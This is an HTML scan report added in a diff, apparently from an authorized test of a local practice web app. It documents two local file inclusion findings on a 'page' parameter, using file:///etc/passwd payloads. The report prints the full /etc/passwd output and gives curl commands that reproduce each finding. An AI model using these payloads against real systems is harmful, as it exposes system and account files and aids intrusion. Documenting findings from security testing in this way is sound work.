@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LFI/RFI Scan Report</title>
+<style>
+  :root {
+    --bg:#0d1117;--bg2:#161b22;--bg3:#21262d;
+    --border:#30363d;--text:#c9d1d9;--text2:#8b949e;
+    --red:#f85149;--orange:#e3b341;--green:#3fb950;
+    --blue:#58a6ff;--purple:#bc8cff;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:"Segoe UI",system-ui,sans-serif;font-size:14px}
+  a{color:var(--blue);text-decoration:none} a:hover{text-decoration:underline}
+  header{background:linear-gradient(135deg,#1a0a0a,#0d1117);border-bottom:3px solid var(--red);padding:28px 40px}
+  header h1{font-size:24px;color:var(--red);letter-spacing:2px;text-transform:uppercase}
+  header .meta{color:var(--text2);margin-top:6px;font-size:12px}
+  nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:10px 40px;display:flex;gap:20px;flex-wrap:wrap}
+  nav a{color:var(--text2);font-size:13px;padding:4px 12px;border-radius:6px;border:1px solid transparent}
+  nav a:hover{border-color:var(--border);color:var(--text)}
+  .summary-bar{display:flex;gap:14px;padding:18px 40px;background:var(--bg2);border-bottom:1px solid var(--border);flex-wrap:wrap}
+  .stat-box{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px 22px;min-width:120px;text-align:center}
+  .stat-box .num{font-size:26px;font-weight:bold} .stat-box .lbl{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-top:3px}
+  .stat-box.hs .num{color:var(--red)} .stat-box.ls .num{color:var(--orange)} .stat-box.ps .num{color:var(--blue)} .stat-box.us .num{color:var(--purple)}
+  main{padding:28px 40px;max-width:1280px}
+  .section-title{font-size:17px;margin:28px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+  .high-title{color:var(--red)} .low-title{color:var(--orange)} .stat-title{color:var(--blue)}
+  .stats-section{margin-bottom:40px}
+  /* Technique stats */
+  .tech-stats{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
+  .tstat{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:6px 14px;display:flex;gap:8px;align-items:center}
+  .tstat-lbl{font-size:12px;color:var(--text2)} .tstat-num{font-weight:bold;color:var(--blue)}
+  /* Tables */
+  .stats-table{width:100%;border-collapse:collapse;font-size:13px}
+  .stats-table th{background:var(--bg3);color:var(--text2);padding:8px 12px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border)}
+  .stats-table td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+  .stats-table tr:hover td{background:var(--bg2)}
+  .tbl-num{width:40px;color:var(--text2);text-align:center} .tbl-count{width:60px;text-align:center;color:var(--orange);font-weight:bold} .tbl-host{color:var(--text2);width:200px;word-break:break-all}
+  .pl-list{display:flex;flex-direction:column;gap:4px} .pl-item{display:flex;gap:6px;align-items:baseline;flex-wrap:wrap}
+  .pl-sig{color:var(--green);font-size:11px} .pl-enc{color:var(--purple);font-size:11px}
+  .url-pl{display:block;margin-bottom:3px}
+  /* Finding cards */
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:18px;overflow:hidden}
+  .card.high{border-left:4px solid var(--red)} .card.low{border-left:4px solid var(--orange)}
+  .card-header{display:flex;align-items:center;gap:8px;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border);flex-wrap:wrap}
+  .poc-num{font-weight:bold;color:var(--text2);min-width:32px} .ml-auto{margin-left:auto} .status-code{font-size:12px;color:var(--text2)}
+  .type-badge{color:#fff;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold}
+  .tech-badge{font-size:11px;font-weight:bold;padding:2px 8px;border-radius:10px;border:1px solid}
+  .tech-badge.std{background:#1a1a2e;color:var(--blue);border-color:var(--blue)}
+  .tech-badge.prefix{background:#1a2a1a;color:var(--green);border-color:var(--green)}
+  .tech-badge.ext{background:#2a1a1a;color:var(--red);border-color:var(--red)}
+  .tech-badge.combined{background:#2a1a2a;color:var(--purple);border-color:var(--purple)}
+  .tech-badge.allowlist{background:#1a2a2a;color:#39d353;border-color:#39d353}
+  .dec-badge{font-size:11px;font-weight:bold;padding:2px 9px;border-radius:10px;border:1px solid}
+  .dec-badge.decoded{background:#2d1b4e;color:var(--purple);border-color:var(--purple)}
+  .dec-badge.plain{background:#1c2a1c;color:var(--green);border-color:var(--green)}
+  .param-label{color:var(--blue);font-family:monospace;font-size:12px}
+  .param-code{color:var(--blue);font-family:monospace;font-size:12px}
+  .detail-table{width:100%;border-collapse:collapse}
+  .detail-table td{padding:8px 16px;border-bottom:1px solid var(--border);vertical-align:top}
+  .dl{color:var(--text2);width:120px;font-size:11px;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap}
+  .dv{color:var(--text);word-break:break-all}
+  code.payload{background:#1a1a2e;color:var(--orange);padding:2px 5px;border-radius:3px;font-size:12px;word-break:break-all;display:inline-block}
+  code.sig{background:#1a2a1a;color:var(--green);padding:2px 5px;border-radius:3px;font-size:12px}
+  .output-block{border-top:1px solid var(--border)}
+  .output-label{background:#1e1040;color:var(--purple);font-size:11px;font-weight:bold;padding:5px 16px;letter-spacing:1px;text-transform:uppercase}
+  .output-pre{background:#0d1117;color:#a5d6ff;padding:14px 16px;font-family:"Cascadia Code","Fira Code",monospace;font-size:12px;line-height:1.6;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:420px;overflow-y:auto}
+  .curl-block{padding:9px 16px;background:var(--bg3);border-top:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+  .curl-label{color:var(--text2);font-size:11px;text-transform:uppercase;white-space:nowrap}
+  code.curl-cmd{color:var(--green);font-size:12px;font-family:monospace;word-break:break-all;cursor:pointer}
+  code.curl-cmd:hover{color:#fff}
+  footer{text-align:center;color:var(--text2);padding:28px;font-size:12px;border-top:1px solid var(--border);margin-top:40px}
+  @media(max-width:700px){main,header,.summary-bar,nav{padding:14px}.dl{width:80px}}
+</style>
+</head>
+<body>
+<header>
+  <h1>&#x1F6E1; LFI / RFI Vulnerability Scan Report</h1>
+  <div class="meta">Scan Time: 2026-06-26  05:50:15 &nbsp;|&nbsp; Authorized penetration testing only</div>
+</header>
+<nav>
+  <a href="#stats-params">Vulnerable Params</a>
+  <a href="#stats-urls">Vulnerable URLs</a>
+  <a href="#stats-payloads">Triggered Payloads</a>
+  <a href="#findings-high">HIGH Findings</a>
+  
+</nav>
+<div class="summary-bar">
+  <div class="stat-box hs"><div class="num">2</div><div class="lbl">HIGH</div></div>
+  <div class="stat-box ls"><div class="num">0</div><div class="lbl">LOW / INFO</div></div>
+  <div class="stat-box us"><div class="num">1</div><div class="lbl">Vuln Params</div></div>
+  <div class="stat-box us" style="--purple:#58a6ff"><div class="num">2</div><div class="lbl">Vuln URLs</div></div>
+  <div class="stat-box ps"><div class="num">2</div><div class="lbl">Unique Payloads</div></div>
+  <div class="stat-box ps" style="--blue:#8b949e"><div class="num">299</div><div class="lbl">Total Probes</div></div>
+</div>
+<main>
+  <div id="stats-params">
+        <div class="stats-section">
+          <h2 class="section-title stat-title">&#x1F4CA; Vulnerable Parameters &mdash; 1 unique</h2>
+          <table class="stats-table">
+            <thead><tr><th>#</th><th>Parameter</th><th>Host</th><th>Hits</th><th>Payloads &amp; Signatures</th></tr></thead>
+            <tbody>
+            <tr>
+              <td class="tbl-num">1</td>
+              <td><code class="param-code">PARAM:page</code></td>
+              <td class="tbl-host">127.0.0.1:42001</td>
+              <td class="tbl-count">2</td>
+              <td><div class="pl-list"><div class="pl-item"><code class="payload">file:///etc/passwd</code> <span class="pl-sig">[root:.*:0:0:]</span> <span class="pl-enc">Plain Text</span></div><div class="pl-item"><code class="payload">file://localhost/etc/passwd</code> <span class="pl-sig">[root:.*:0:0:]</span> <span class="pl-enc">Plain Text</span></div></div></td>
+            </tr></tbody>
+          </table>
+        </div></div>
+  <div id="stats-urls">
+        <div class="stats-section">
+          <h2 class="section-title stat-title">&#x1F517; Vulnerable URLs &mdash; 2 unique</h2>
+          <table class="stats-table">
+            <thead><tr><th>#</th><th>URL</th><th>Hits</th><th>Payloads Triggered</th></tr></thead>
+            <tbody>
+            <tr>
+              <td class="tbl-num">1</td>
+              <td class="url-cell"><a href="http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd" target="_blank">http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd</a></td>
+              <td class="tbl-count">1</td>
+              <td><div class="pl-list"><code class="payload url-pl">file:///etc/passwd</code></div></td>
+            </tr>
+            <tr>
+              <td class="tbl-num">2</td>
+              <td class="url-cell"><a href="http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2Flocalhost%2Fetc%2Fpasswd" target="_blank">http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2Flocalhost%2Fetc%2Fpasswd</a></td>
+              <td class="tbl-count">1</td>
+              <td><div class="pl-list"><code class="payload url-pl">file://localhost/etc/passwd</code></div></td>
+            </tr></tbody>
+          </table>
+        </div></div>
+  <div id="stats-payloads">
+        <div class="stats-section">
+          <h2 class="section-title stat-title">&#x1F9E8; All Triggered Payloads &mdash; 2 unique</h2>
+          <div class="tech-stats"><div class="tstat"><span class="tstat-lbl">Standard Traversal</span><span class="tstat-num">2</span></div></div>
+          <table class="stats-table">
+            <thead><tr><th>#</th><th>Payload</th></tr></thead>
+            <tbody><tr><td class="tbl-num">1</td><td><code class="payload">file:///etc/passwd</code></td></tr><tr><td class="tbl-num">2</td><td><code class="payload">file://localhost/etc/passwd</code></td></tr></tbody>
+          </table>
+        </div></div>
+  <div id="findings-high"><section><h2 class="section-title high-title">&#x1F534; HIGH SEVERITY &mdash; 2 Finding(s)</h2>
+        <div class="card high" id="poc-1">
+          <div class="card-header">
+            <span class="poc-num">#1</span>
+            <span class="type-badge" style="background:#e74c3c">LFI</span> <span class="tech-badge std">Standard</span> <span class="dec-badge plain">Plain Text</span>
+            <span class="param-label">PARAM:page</span>
+            <span class="status-code ml-auto">HTTP 200</span>
+          </div>
+          <table class="detail-table">
+            <tr><td class="dl">Target URL</td><td class="dv url-cell"><a href="http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd" target="_blank">http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd</a></td></tr>
+            <tr><td class="dl">Parameter</td><td class="dv">PARAM:page</td></tr>
+            <tr><td class="dl">Payload</td><td class="dv"><code class="payload">file:///etc/passwd</code></td></tr>
+            <tr><td class="dl">Signature</td><td class="dv"><code class="sig">root:.*:0:0:</code></td></tr>
+            <tr><td class="dl">Output Type</td><td class="dv"><span class="dec-badge plain">Plain Text</span></td></tr>
+          </table>
+          <div class="output-block"><div class="output-label">Response Snippet</div><pre class="output-pre">root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+dhcpcd:x:996:996:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
+systemd-timesync:x:990:990:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:989:989:System Message Bus:/nonexistent:/usr/sbin/nologin
+tss:x:987:987:tss user for tpm2:/:/usr/sbin/nologin
+strongswan:x:100:65534::/var/lib/strongswan:/usr/sbin/nologin
+tcpdump:x:986:986:tcpdump:/nonexistent:/usr/sbin/nologin
+sshd:x:985:65534:sshd user:/run/sshd:/usr/sbin/nologin
+_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:102:65534::/var/lib/nfs:/usr/sbin/nologin
+dnsmasq:x:984:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+avahi:x:103:105:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
+nm-openvpn:x:983:983:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
+speech-dispatcher:x:982:982:Speech Dispatcher:/run/speech-dispatcher:/bin/false
+usbmux:x:104:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+nm-openconnect:x:981:981:NetworkManager OpenConnect plugin:/:/usr/sbin/nologin
+pipewire:x:980:980:system user for pipewire:/nonexistent:/usr/sbin/nologin
+saned:x:105:106::/var/lib/saned:/usr/sbin/nologin
+lightdm:x:106:107:Light Display Manager:/var/lib/lightdm:/bin/false
+polkitd:x:979:979:User for polkitd:/:/usr/sbin/nologin
+rtkit:x:978:978:RealtimeKit:/proc:/usr/sbin/nologin
+colord:x:977:977:colord colour management daemon:/var/lib/colord:/usr/sbin/nologin</pre></div>
+          <div class="curl-block">
+            <span class="curl-label">Reproduce:</span>
+            <code class="curl-cmd" title="Click to copy">curl -sk "http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd"</code>
+          </div>
+        </div>
+        <div class="card high" id="poc-2">
+          <div class="card-header">
+            <span class="poc-num">#2</span>
+            <span class="type-badge" style="background:#e74c3c">LFI</span> <span class="tech-badge std">Standard</span> <span class="dec-badge plain">Plain Text</span>
+            <span class="param-label">PARAM:page</span>
+            <span class="status-code ml-auto">HTTP 200</span>
+          </div>
+          <table class="detail-table">
+            <tr><td class="dl">Target URL</td><td class="dv url-cell"><a href="http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2Flocalhost%2Fetc%2Fpasswd" target="_blank">http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2Flocalhost%2Fetc%2Fpasswd</a></td></tr>
+            <tr><td class="dl">Parameter</td><td class="dv">PARAM:page</td></tr>
+            <tr><td class="dl">Payload</td><td class="dv"><code class="payload">file://localhost/etc/passwd</code></td></tr>
+            <tr><td class="dl">Signature</td><td class="dv"><code class="sig">root:.*:0:0:</code></td></tr>
+            <tr><td class="dl">Output Type</td><td class="dv"><span class="dec-badge plain">Plain Text</span></td></tr>
+          </table>
+          <div class="output-block"><div class="output-label">Response Snippet</div><pre class="output-pre">root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+dhcpcd:x:996:996:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
+systemd-timesync:x:990:990:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:989:989:System Message Bus:/nonexistent:/usr/sbin/nologin
+tss:x:987:987:tss user for tpm2:/:/usr/sbin/nologin
+strongswan:x:100:65534::/var/lib/strongswan:/usr/sbin/nologin
+tcpdump:x:986:986:tcpdump:/nonexistent:/usr/sbin/nologin
+sshd:x:985:65534:sshd user:/run/sshd:/usr/sbin/nologin
+_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:102:65534::/var/lib/nfs:/usr/sbin/nologin
+dnsmasq:x:984:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+avahi:x:103:105:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
+nm-openvpn:x:983:983:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
+speech-dispatcher:x:982:982:Speech Dispatcher:/run/speech-dispatcher:/bin/false
+usbmux:x:104:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+nm-openconnect:x:981:981:NetworkManager OpenConnect plugin:/:/usr/sbin/nologin
+pipewire:x:980:980:system user for pipewire:/nonexistent:/usr/sbin/nologin
+saned:x:105:106::/var/lib/saned:/usr/sbin/nologin
+lightdm:x:106:107:Light Display Manager:/var/lib/lightdm:/bin/false
+polkitd:x:979:979:User for polkitd:/:/usr/sbin/nologin
+rtkit:x:978:978:RealtimeKit:/proc:/usr/sbin/nologin
+colord:x:977:977:colord colour management daemon:/var/lib/colord:/usr/sbin/nologin</pre></div>
+          <div class="curl-block">
+            <span class="curl-label">Reproduce:</span>
+            <code class="curl-cmd" title="Click to copy">curl -sk "http://127.0.0.1:42001/vulnerabilities/fi/?page=file%3A%2F%2Flocalhost%2Fetc%2Fpasswd"</code>
+          </div>
+        </div></section></div>
+  <div id="findings-low"></div>
+  
+</main>
+<footer>Generated by LFI/RFI Scanner &mdash; Authorized use only</footer>
+<script>
+  document.querySelectorAll("code.curl-cmd").forEach(el => {
+    el.addEventListener("click", () => {
+      navigator.clipboard.writeText(el.textContent).then(() => {
+        const o = el.style.color; el.style.color = "#3fb950";
+        setTimeout(() => el.style.color = o, 700);
+      });
+    });
+  });
+</script>
+</body>
+</html>
